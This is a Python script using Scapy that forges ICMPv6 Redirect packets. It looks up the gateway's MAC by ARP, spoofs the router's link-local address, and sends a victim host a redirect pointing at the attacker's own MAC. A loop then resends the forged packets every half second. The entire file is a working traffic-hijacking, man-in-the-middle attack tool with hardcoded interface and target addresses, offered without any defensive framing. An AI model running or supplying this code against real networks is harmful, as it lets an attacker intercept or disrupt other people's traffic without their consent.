from scapy.all import *
from Get_MAC import *
from mactoipv6linklocal import *


def sendarp(srcip, dstip, ifname):
    srcmac = GET_MAC(ifname)
    p1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=srcmac) / ARP(op=1,
                                                                                          hwsrc=srcmac,
                                                                                          hwdst='00:00:00:00:00:00',
                                                                                pdst=dstip,
                                                                                  psrc=srcip )
    result_raw = srp(p1, timeout=3, iface=ifname)
    result_list = result_raw[0].res

    # 扫描得到的IP和MAC地址对的清单
    router_mac = result_list[0][1].getlayer(ARP).fields['hwsrc']
    return router_mac


def icmpv6_redirect(ifname, localipv4, gwip, dst):
    router_mac = sendarp(localipv4, gwip, ifname)
    srcmac = GET_MAC(ifname)
    eth = Ether(src=srcmac, dst=sendarp(localipv4, dstip=gwip, ifname=ifname))
    ipv6 = IPv6(src=mac_to_ipv6_linklocal(router_mac), dst="2001::494c:e60:20f9:dca8")
    icmpv6_redirect = ICMPv6ND_Redirect(tgt="fe80::1c92:9a74:2735:88b1", dst=dst)
    tlladdr = ICMPv6NDOptDstLLAddr(lladdr=srcmac)

    packet = eth / ipv6 / icmpv6_redirect / tlladdr
    print(packet.show())
    return packet


while 1:
    packet = icmpv6_redirect("en0", "52.1.1.129", "52.1.1.1", "66::1")
    sendp(packet, iface="en0")
    time.sleep(0.5)